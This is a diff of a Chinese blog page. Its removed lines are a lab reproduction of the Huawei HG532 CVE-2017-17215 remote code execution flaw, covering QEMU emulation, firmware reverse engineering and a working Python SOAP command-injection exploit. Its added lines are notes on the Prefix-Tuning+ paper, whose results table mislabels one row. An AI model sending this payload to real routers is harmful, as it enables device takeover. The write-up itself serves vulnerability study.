@@ -19,40 +19,29 @@
   <meta name="author" content="zer0ptr">
   <meta name="keywords" content="">
   
-    <meta name="description" content="兜兜转转终于是上手开搞iot了。 Description 该远程命令执行漏洞存在于华为HG532路由器，由Check Point安全人员纰漏。 华为设备中的TR-064实现通过37215端口（UPnP）暴露在广域网。 从设备的upnp描述中有一个叫 DeviceUpgrade 的服务，该服务通过向 &#x2F;ctrlt&#x2F;DeviceUpgrade_1（称为controlURL）发送请求来执行固件升级。 并">
+    <meta name="description" content="Title: Prefix-Tuning+: Modernizing Prefix-Tuning through Attention Independent Prefix Data   Authors: Haonan Wang, Brian K. Chen, Siquan Li, Xinhe Liang, Hwee Kuan Lee, Kenji Kawaguchi, Tianyang Hu">
 <meta property="og:type" content="article">
-<meta property="og:title" content="华为HG532远程代码执行漏洞复现">
-<meta property="og:url" content="https://zer0ptr.github.io/2026/05/23/iot-huawei-hg532-rce/index.html">
+<meta property="og:title" content="【论文笔记】Prefix-Tuning+: Modernizing Prefix-Tuning through Attention Independent Prefix Data">
+<meta property="og:url" content="https://zer0ptr.github.io/2026/05/23/prefix-tunning-plus/index.html">
 <meta property="og:site_name" content="zer0ptr&#39;s blog">
-<meta property="og:description" content="兜兜转转终于是上手开搞iot了。 Description 该远程命令执行漏洞存在于华为HG532路由器，由Check Point安全人员纰漏。 华为设备中的TR-064实现通过37215端口（UPnP）暴露在广域网。 从设备的upnp描述中有一个叫 DeviceUpgrade 的服务，该服务通过向 &#x2F;ctrlt&#x2F;DeviceUpgrade_1（称为controlURL）发送请求来执行固件升级。 并">
+<meta property="og:description" content="Title: Prefix-Tuning+: Modernizing Prefix-Tuning through Attention Independent Prefix Data   Authors: Haonan Wang, Brian K. Chen, Siquan Li, Xinhe Liang, Hwee Kuan Lee, Kenji Kawaguchi, Tianyang Hu">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://zer0ptr.github.io/images/iot-hg532/2.png">
-<meta property="og:image" content="https://zer0ptr.github.io/images/iot-hg532/3.png">
-<meta property="og:image" content="https://zer0ptr.github.io/images/iot-hg532/4.png">
-<meta property="og:image" content="https://zer0ptr.github.io/images/iot-hg532/5.png">
-<meta property="og:image" content="https://zer0ptr.github.io/images/iot-hg532/7.png">
-<meta property="og:image" content="https://zer0ptr.github.io/images/iot-hg532/8.png">
-<meta property="og:image" content="https://zer0ptr.github.io/images/iot-hg532/9.png">
-<meta property="og:image" content="https://zer0ptr.github.io/images/iot-hg532/10.png">
-<meta property="og:image" content="https://zer0ptr.github.io/images/iot-hg532/11.png">
-<meta property="og:image" content="https://zer0ptr.github.io/images/iot-hg532/12.png">
-<meta property="og:image" content="https://zer0ptr.github.io/images/iot-hg532/13.png">
-<meta property="og:image" content="https://zer0ptr.github.io/images/iot-hg532/14.png">
-<meta property="og:image" content="https://zer0ptr.github.io/images/iot-hg532/15.png">
-<meta property="og:image" content="https://zer0ptr.github.io/images/iot-hg532/6.png">
-<meta property="article:published_time" content="2026-05-23T05:44:27.000Z">
-<meta property="article:modified_time" content="2026-05-29T16:23:43.726Z">
+<meta property="og:image" content="https://zer0ptr.github.io/images/prefix-tunning-plus/figure1.png">
+<meta property="article:published_time" content="2026-05-23T14:53:56.000Z">
+<meta property="article:modified_time" content="2026-05-30T05:05:31.284Z">
 <meta property="article:author" content="zer0ptr">
-<meta property="article:tag" content="IOT">
-<meta property="article:tag" content="CVE">
+<meta property="article:tag" content="PEFT">
+<meta property="article:tag" content="prefix Tuning">
+<meta property="article:tag" content="llm code generation">
+<meta property="article:tag" content="AI Safety">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://zer0ptr.github.io/images/iot-hg532/2.png">
+<meta name="twitter:image" content="https://zer0ptr.github.io/images/prefix-tunning-plus/figure1.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>华为HG532远程代码执行漏洞复现 - zer0ptr&#39;s blog</title>
+  <title>【论文笔记】Prefix-Tuning+: Modernizing Prefix-Tuning through Attention Independent Prefix Data - zer0ptr&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -434,7 +423,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="华为HG532远程代码执行漏洞复现"></span>
+            <span id="subtitle" data-typed-text="【论文笔记】Prefix-Tuning+: Modernizing Prefix-Tuning through Attention Independent Prefix Data"></span>
           
         </div>
 
@@ -445,8 +434,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2026-05-23 13:44" pubdate>
-          2026年5月23日 下午
+        <time datetime="2026-05-23 22:53" pubdate>
+          2026年5月23日 晚上
         </time>
       </span>
     
@@ -457,7 +446,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          5.9k 字
+          1.6k 字
         
       </span>
     
@@ -468,7 +457,7 @@
         
         
         
-          50 分钟
+          14 分钟
         
       </span>
     
@@ -507,109 +496,131 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">华为HG532远程代码执行漏洞复现</h1>
+            <h1 id="seo-header">【论文笔记】Prefix-Tuning+: Modernizing Prefix-Tuning through Attention Independent Prefix Data</h1>
             
             
               <div class="markdown-body">
                 
-                <p>兜兜转转终于是上手开搞iot了。</p>
-<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><ol>
-<li>该远程命令执行漏洞存在于华为HG532路由器，由Check Point安全人员纰漏。</li>
-<li>华为设备中的TR-064实现通过37215端口（UPnP）暴露在广域网。</li>
-<li>从设备的upnp描述中有一个叫 <code>DeviceUpgrade</code> 的服务，该服务通过向 <code>/ctrlt/DeviceUpgrade_1</code>（称为controlURL）发送请求来执行固件升级。</li>
-<li>并通过两个元素 <code>NewStatusURL</code> 和 <code>NewDownloadURL</code> 执行。</li>
-<li>该漏洞允许远程管理员通过在 NewStatusURL 和 NewDownloadURL 中注入 shell 元字符“$（）”来执行任意命令。</li>
-</ol>
-<p>这里有我找的一份固件，可以在这里下载：<a href="/attachment/">click here</a></p>
-<h2 id="开搞！"><a href="#开搞！" class="headerlink" title="开搞！"></a>开搞！</h2><h3 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h3><blockquote>
-<p>真正的解决方案在这里，笔者最终还是去折腾网桥了（</p>
-<p><strong>1. 问题诊断</strong></p>
-<p><strong>根本原因</strong>：网桥 <code>br0</code> 下缺少 <code>tap0</code> 接口。执行 <code>sudo brctl show br0</code> 只显示：</p>
-<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">bridge </span>name    <span class="hljs-keyword">bridge </span>id        STP enabled    interfaces<br><span class="hljs-keyword">br0 </span>           <span class="hljs-number">8000</span>.<span class="hljs-number">9</span>a<span class="hljs-symbol">6776f</span><span class="hljs-symbol">76b</span>27    no         ens33<br></code></pre></td></tr></table></figure>
-<p>没有 <code>tap0</code>，导致 QEMU 虚拟网卡无法连接到网桥，宿主机与 QEMU 之间无法通信。</p>
-<p><strong>2. 解决方案</strong></p>
-<p><strong>第一步：创建并配置 tap0</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> tunctl -t tap0 -u pwn        <span class="hljs-comment"># 创建 tap0 设备</span><br><span class="hljs-built_in">sudo</span> ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> tap0 up          <span class="hljs-comment"># 启用 tap0</span><br><span class="hljs-built_in">sudo</span> brctl addif br0 tap0         <span class="hljs-comment"># 将 tap0 加入网桥</span><br><span class="hljs-built_in">sudo</span> brctl show br0               <span class="hljs-comment"># 验证（现在应该看到 tap0）</span><br></code></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> qemu-system-mips \<br>    -M malta \<br>    -kernel vmlinux-2.6.32-5-4kc-malta \<br>    -hda debian_squeeze_mips_standard.qcow2 \<br>    -append <span class="hljs-string">&quot;root=/dev/sda1 console=tty0&quot;</span> \<br>    -net nic,macaddr=00:16:3e:00:00:01 \<br>    -net tap,ifname=tap0,script=no,downscript=no \<br>    -nographic<br></code></pre></td></tr></table></figure>
-<p>关键点：<code>-net tap,ifname=tap0,script=no,downscript=no</code> 明确指定使用已创建的 <code>tap0</code>。</p>
-<p><strong>在 QEMU 内配置 IP</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">ifconfig eth1 192.168.138.131 netmask 255.255.255.0 up<br>route add default gw 192.168.138.1<br>ping 192.168.138.130   <span class="hljs-comment"># 验证连通性</span><br></code></pre></td></tr></table></figure>
-
-<p>successed!</p>
-<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">64 </span>bytes from <span class="hljs-number">192.168</span>.<span class="hljs-number">138.130</span>: icmp_req=<span class="hljs-number">1</span> ttl=<span class="hljs-number">64</span> time=<span class="hljs-number">5.06</span> ms<br><span class="hljs-symbol">5 </span>packets transmitted, <span class="hljs-number">5</span> received, <span class="hljs-number">0</span>% packet loss<br></code></pre></td></tr></table></figure>
-<p>网络跑通后可以继续了</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /root/rootfs &amp;&amp; <span class="hljs-built_in">chroot</span> . sh<br>./bin/upnp &amp;<br>./bin/mic &amp;<br><br><br>我这里使用端口转发方案，就不去折腾网桥了。<br><br>然后是解包固件：<br><br>```bash<br>wn@pwn:~/Desktop/HUAWEI-HG532$ <span class="hljs-built_in">cd</span> _HG532eV100R001C02B015_upgrade_main.bin.extracted/<br>pwn@pwn:~/Desktop/HUAWEI-HG532/_HG532eV100R001C02B015_upgrade_main.bin.extracted$ <span class="hljs-built_in">ls</span><br>180  180.7z  DC080.squashfs  squashfs-root<br>pwn@pwn:~/Desktop/HUAWEI-HG532/_HG532eV100R001C02B015_upgrade_main.bin.extracted$ <br></code></pre></td></tr></table></figure>
+                <blockquote>
+<p>Title: Prefix-Tuning+: Modernizing Prefix-Tuning through Attention Independent Prefix Data  </p>
+<p>Authors: Haonan Wang, Brian K. Chen, Siquan Li, Xinhe Liang, Hwee Kuan Lee, Kenji Kawaguchi, Tianyang Hu  </p>
+<p>Affiliations: National University of Singapore; Bioinformatics Institute, A*STAR; Nanyang Technological University; Singapore Eye Research Institute; Singapore International Research Laboratory on AI; Singapore Institute for Clinical Sciences.  </p>
+<p>Conference: ICML 2025  </p>
+<p>PDF: <a target="_blank" rel="noopener" href="https://arxiv.org/pdf/2506.13674v1">https://arxiv.org/pdf/2506.13674v1</a></p>
 </blockquote>
-<p>下载qemu需要的文件：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~/Desktop/HUAWEI-HG532/<br>wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-2.6.32-5-4kc-malta<br>wget https://people.debian.org/~aurel32/qemu/mips/debian_squeeze_mips_standard.qcow2<br></code></pre></td></tr></table></figure>
-
-<p>启动：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">sudo</span> qemu-system-mips \<br>    -M malta \<br>    -kernel vmlinux-2.6.32-5-4kc-malta \<br>    -hda debian_squeeze_mips_standard.qcow2 \<br>    -append <span class="hljs-string">&quot;root=/dev/sda1 console=tty0&quot;</span> \<br>    -net user,hostfwd=tcp::37215-:37215,hostfwd=tcp::2222-:22 \<br>    -net nic,macaddr=00:16:3e:00:00:01 \<br>    -nographic<br></code></pre></td></tr></table></figure>
-
-<p><img src="/images/iot-hg532/2.png" srcset="/img/loading.gif" lazyload alt="登录 qemu"></p>
-<p>打开另一个终端，拷贝固件文件系统：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 确认文件系统位置</span><br><span class="hljs-built_in">ls</span> ~/Desktop/HUAWEI-HG532/_HG532eV100R001C02B015_upgrade_main.bin.extracted/squashfs-root/<br><br><span class="hljs-comment"># 拷贝到 qemu</span><br>scp -P 2222 -r ~/Desktop/HUAWEI-HG532/_HG532eV100R001C02B015_upgrade_main.bin.extracted/squashfs-root root@127.0.0.1:/root/<br></code></pre></td></tr></table></figure>
-
-<p>如果上述没有办法成功拷贝的话那就是网络配置出现了问题，现在我们来搞一下qemu里面的网络配置：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 启用 eth1 并配置 IP</span><br>ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> eth1 up<br>ip addr add 10.0.2.15/24 dev eth1<br>ip route add default via 10.0.2.2<br><br><span class="hljs-comment"># 验证配置</span><br>ip addr show eth1<br>ip route<br></code></pre></td></tr></table></figure>
-
-<p>然后在解包的目录下用python跑一个http-server然后在qemu中下载：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 下载文件</span><br>wget http://10.0.2.2:8000/squashfs-root.tar.gz<br></code></pre></td></tr></table></figure>
-
+<h3 id="一、研究背景与动机"><a href="#一、研究背景与动机" class="headerlink" title="一、研究背景与动机"></a>一、研究背景与动机</h3><ul>
+<li><strong>Prefix-Tuning</strong>：是一种经典的 PEFT 方法：在输入序列前添加可学习的“前缀”，通过影响注意力机制来引导模型生成。</li>
+<li>但作者发现，在当前主流的大型语言模型（LLM）上，标准 Prefix-Tuning 的效果远不如 LoRA。</li>
+<li><strong>核心问题</strong>：不是前缀长度或初始化问题，而是一个架构级别的缺陷———前缀与真实输入在注意力头内部存在冲突。</li>
+</ul>
+<p><img src="/images/prefix-tunning-plus/figure1.png" srcset="/img/loading.gif" lazyload alt="Figure 1: Performance comparison between Prefix-Tuning and LoRA."></p>
+<h3 id="二、问题诊断"><a href="#二、问题诊断" class="headerlink" title="二、问题诊断"></a>二、问题诊断</h3><table>
+<thead>
+<tr>
+<th>现象</th>
+<th>原因</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>前缀过长</td>
+<td>模型过度关注前缀，忽略输入内容</td>
+</tr>
+<tr>
+<td>输入过长</td>
+<td>前缀影响被稀释</td>
+</tr>
+<tr>
+<td>本质</td>
+<td>注意力机制中，前缀与真实输入共享注意力分数，导致此消彼长</td>
+</tr>
+</tbody></table>
 <blockquote>
-<p>这里又踩了一个坑，我们解压出来的<code>squashfs-root</code>目录是空的，这是因为这种文件还需要我们用unsquashfs去解压，但是华为可以改了格式，这里我们使用Firmware Mod Kit去解压</p>
+<p>前缀应当影响模型行为，但不应该与输入内容“争夺”注意力权重。</p>
 </blockquote>
-<p><img src="/images/iot-hg532/3.png" srcset="/img/loading.gif" lazyload alt="Firmware extraction successful"></p>
-<p>然后打包下载</p>
-<p><img src="/images/iot-hg532/4.png" srcset="/img/loading.gif" lazyload></p>
-<p>之后我们进到qemu所在窗口：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://10.0.2.2:8000/rootfs.tar.gz<br>tar -xzf rootfs.tar.gz<br><br><span class="hljs-built_in">cd</span> rootfs<br><span class="hljs-built_in">chroot</span> . /bin/sh<br>./bin/upnp &amp;<br>./bin/mic &amp;<br><span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="/images/iot-hg532/5.png" srcset="/img/loading.gif" lazyload alt="酱紫就成功啦！"></p>
-<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们可以在 <code>/firmware-mod-kit/fmk/rootfs/bin</code> 文件夹内找到存在漏洞的upnp二进制文件，并使用checksec upnp查看其信息：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwn@pwn:~/Desktop/firmware-mod-kit/fmk/rootfs/bin$ checksec ./upnp<br>[*] Checking <span class="hljs-keyword">for</span> new versions of pwntools<br>    To <span class="hljs-built_in">disable</span> this functionality, <span class="hljs-built_in">set</span> the contents of /home/pwn/.cache/.pwntools-cache-3.10/update to <span class="hljs-string">&#x27;never&#x27;</span> (old way).<br>    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):<br>        [update]<br>        interval=never<br>[*] You have the latest version of Pwntools (4.15.0)<br>[!] Could not populate MIPS GOT: seek out of range<br>[!] Did not find any GOT entries<br>[*] <span class="hljs-string">&#x27;/home/pwn/Desktop/firmware-mod-kit/fmk/rootfs/bin/upnp&#x27;</span><br>    Arch:       mips-32-big<br>    RELRO:      No RELRO<br>    Stack:      No canary found<br>    NX:         NX unknown - GNU_STACK missing<br>    PIE:        No PIE (0x400000)<br>    Stack:      Executable<br>    RWX:        Has RWX segments<br></code></pre></td></tr></table></figure>
-
-<p>可以看到，这是一个32位大端序的mips架构下的二进制文件，并且没有开任何保护。</p>
-<p>根据官方的漏洞报告，我们知道漏洞存在于 <code>/bin/upnp</code> 和 <code>/bin/mic</code>二进制文件中，先将其拖进IDA中进行逆向分析：</p>
-<p>main函数里有对网络服务进行初始化的核心调用，跟进init函数，会发现里面是个循环，循环次数是第二个参数5，然后对m_astInetdApps数组中的每一项操作，跟进数组</p>
-<p><img src="/images/iot-hg532/7.png" srcset="/img/loading.gif" lazyload></p>
-<p>进来之后看到这里跑了一个Socket Server，根据Socket参数定义设想v16为IP地址，我们看看这个v16是怎么定义的：</p>
-<p><img src="/images/iot-hg532/8.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/images/iot-hg532/9.png" srcset="/img/loading.gif" lazyload></p>
-<p>我们这里来解释一下：</p>
-<ol>
-<li><code>v16 = v31;</code>：v31 是解析出的 IP 地址字符串</li>
-<li><code>if ( !v28 ) v16 = 0;</code>：0 &#x3D; NULL &#x3D; INADDR_ANY</li>
+<h3 id="核心方法：Prefix-Tuning-PMT"><a href="#核心方法：Prefix-Tuning-PMT" class="headerlink" title="核心方法：Prefix Tuning+(PMT)"></a>核心方法：Prefix Tuning+(PMT)</h3><blockquote>
+<p>该方法的具体名称经历了由<em>PT+<em>改为</em>PMT(PrefixMemotyTuning)<em>，在此笔者最终决定统一表述为</em>PMT</em></p>
+</blockquote>
+<h4 id="设计思想"><a href="#设计思想" class="headerlink" title="设计思想"></a>设计思想</h4><blockquote>
+<p>将前缀从注意力头内部解耦出来，不再参与注意力权重的竞争。</p>
+</blockquote>
+<h4 id="如何实现？"><a href="#如何实现？" class="headerlink" title="如何实现？"></a>如何实现？</h4><ul>
+<li>引入一个<strong>独立于注意力机制的外部模块</strong></li>
+<li>该模块由一个可训练的矩阵和表示函数组成</li>
+<li>不改变原始注意力计算流程，而是并行地影响表示</li>
+</ul>
+<p>形式上可以理解为：前缀不再挤占输入的位置，而是作为一种独立的控制信号。</p>
+<h4 id="与传统Prefix-Tuning的区别"><a href="#与传统Prefix-Tuning的区别" class="headerlink" title="与传统Prefix Tuning的区别"></a>与传统Prefix Tuning的区别</h4><table>
+<thead>
+<tr>
+<th></th>
+<th>Prefix-Tuning</th>
+<th>PMT</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>前缀作用方式</td>
+<td>与输入拼接，参与注意力计算</td>
+<td>独立于注意力，不参与权重竞争</td>
+</tr>
+<tr>
+<td>与输入的交互</td>
+<td>竞争注意力权重</td>
+<td>无直接竞争</td>
+</tr>
+<tr>
+<td>对长输入的适应性</td>
+<td>差</td>
+<td>好</td>
+</tr>
+</tbody></table>
+<h3 id="四、实验设置与结果"><a href="#四、实验设置与结果" class="headerlink" title="四、实验设置与结果"></a>四、实验设置与结果</h3><h4 id="任务类型"><a href="#任务类型" class="headerlink" title="任务类型"></a>任务类型</h4><ul>
+<li>少量样本学习（few-shot）</li>
+<li>多个NLU和NLG基准任务</li>
+</ul>
+<h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><ul>
+<li>全参数微调</li>
+<li>Prefix-Tuning</li>
+<li>LoRA</li>
+</ul>
+<h4 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h4><table>
+<thead>
+<tr>
+<th>方法</th>
+<th>相对LoRA的表现</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Prefix Tuning</td>
+<td>显著落后</td>
+</tr>
+<tr>
+<td>Prefix Tuning</td>
+<td>平均提升 8.1%（优于 LoRA）</td>
+</tr>
+<tr>
+<td>相比 Prefix-Tuning</td>
+<td>提升 29.4%</td>
+</tr>
+</tbody></table>
+<p><strong>结论：</strong></p>
+<ul>
+<li>PMT(PT+) 不仅修复了 Prefix-Tuning 的缺陷，还达到了与 LoRA 相当甚至更优的性能。</li>
+<li>证明了“前缀式方法”在现代化改造后仍然具有竞争力。</li>
+</ul>
+<h3 id="五、贡献与总结"><a href="#五、贡献与总结" class="headerlink" title="五、贡献与总结"></a>五、贡献与总结</h3><ol>
+<li><p><strong>问题诊断</strong>：首次明确指出 Prefix-Tuning 在现代 LLM 上失效的根本原因是注意力内部的“零和博弈”。</p>
+</li>
+<li><p><strong>方法创新</strong>：提出 PT+，通过注意力独立的前缀机制彻底解决该问题。</p>
+</li>
+<li><p><strong>实验验证</strong>：在多个任务上显著超越原版 Prefix-Tuning，并达到与 LoRA 相当或更好的效果。</p>
+</li>
+<li><p><strong>方法论启发</strong>：提醒研究者重新审视经典 PEFT 方法在新架构下的适用性。</p>
+</li>
 </ol>
-<p>而对应如下：</p>
-<ol>
-<li>配置字符串格式为 服务名|IP|端口|命令</li>
-<li>v16 从解析出的 IP 字段赋值</li>
-<li>0 在 socket 编程中代表 INADDR_ANY（绑定所有接口）</li>
-</ol>
-<p>由此我们可以得出：固件没有限制该服务只能绑定在内网接口（LAN 口），导致它绑定到 0.0.0.0（所有接口），从而暴露在广域网（WAN）侧，互联网上的攻击者可以直接向该端口发送特制的 SOAP 数据包，触发命令注入漏洞，实现远程代码执行。</p>
-<p>接下来是具体存在漏洞的文件：</p>
-<p><img src="/images/iot-hg532/10.png" srcset="/img/loading.gif" lazyload></p>
-<p>在main函数中就可以看到server1监听37215端口，然后去看ATP_UPNP_Init这个upnp框架的初始化函数</p>
-<p><img src="/images/iot-hg532/11.png" srcset="/img/loading.gif" lazyload></p>
-<p>看到注册upnp设备和服务的函数，继续跟进，然后就能看到整个TR-064服务的服务注册与功能注册函数，然后跟进功能注册：</p>
-<p><img src="/images/iot-hg532/12.png" srcset="/img/loading.gif" lazyload></p>
-<p>从官方漏洞报告中我们得知id为21的action对应Upgrade，注册这个action的句柄是从 <code>v9 = ATP_UPnP_RegService(v33, &quot;WANPPPConnection:1&quot;, &quot;WanPppConn.xml&quot;, 3, 1, 0, &amp;v34);</code> 处返回的。</p>
-<p>之后一样跟进v66那个函数：</p>
-<p><img src="/images/iot-hg532/13.png" srcset="/img/loading.gif" lazyload></p>
-<p>通过前面一些不知何意味的条件之后就来到了 <code>g_astActionArray</code></p>
-<p><img src="/images/iot-hg532/14.png" srcset="/img/loading.gif" lazyload></p>
-<p>跟进到这个函数地址：</p>
-<p><img src="/images/iot-hg532/15.png" srcset="/img/loading.gif" lazyload></p>
-<p>这就是DeviceUpgrade服务的action函数，它从 SOAP 请求中提取 NewDownloadURL&#x2F;NewStatusURL 参数，没有任何过滤，直接拼接后（因为;会连接两个独立语句）通过 system() 执行，导致RCE了。</p>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>Authorization = <span class="hljs-string">&quot;Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669&quot;</span><br>headers = &#123;<span class="hljs-string">&quot;Authorization&quot;</span>: Authorization&#125;<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-----CVE-2017-17215 HUAWEI HG532 RCE-----\n&quot;</span>)<br>cmd = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;command &gt; &quot;</span>)<br><br>data = <span class="hljs-string">f&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="hljs-string">&lt;s:Envelope s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="hljs-string">    &lt;s:Body&gt;</span><br><span class="hljs-string">        &lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;</span><br><span class="hljs-string">            &lt;NewStatusURL&gt;;mkdir lontan0;&lt;/NewStatusURL&gt;</span><br><span class="hljs-string">            &lt;NewDownloadURL&gt;;<span class="hljs-subst">&#123;cmd&#125;</span>;&lt;/NewDownloadURL&gt;</span><br><span class="hljs-string">        &lt;/u:Upgrade&gt;</span><br><span class="hljs-string">    &lt;/s:Body&gt;</span><br><span class="hljs-string">&lt;/s:Envelope&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>r = requests.post(<span class="hljs-string">&#x27;http://192.168.138.131:37215/ctrlt/DeviceUpgrade_1&#x27;</span>, headers = headers, data = data)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nstatus_code: &quot;</span> + <span class="hljs-built_in">str</span>(r.status_code))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + r.text)<br></code></pre></td></tr></table></figure>
-
-<p><img src="/images/iot-hg532/6.png" srcset="/img/loading.gif" lazyload alt="成功exploit"></p>
-<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/90989">https://xz.aliyun.com/news/90989</a></li>
-<li><a target="_blank" rel="noopener" href="https://wsxk.github.io/IotVulhub/#1-vivotek">https://wsxk.github.io/IotVulhub/#1-vivotek</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cosyQAQ/p/19049647">https://www.cnblogs.com/cosyQAQ/p/19049647</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.iotsec-zone.com/article/384#%E5%8D%8E%E4%B8%BAhg532%E8%B7%AF%E7%94%B1%E5%99%A8rce%E6%BC%8F%E6%B4%9E">https://www.iotsec-zone.com/article/384#%E5%8D%8E%E4%B8%BAhg532%E8%B7%AF%E7%94%B1%E5%99%A8rce%E6%BC%8F%E6%B4%9E</a></li>
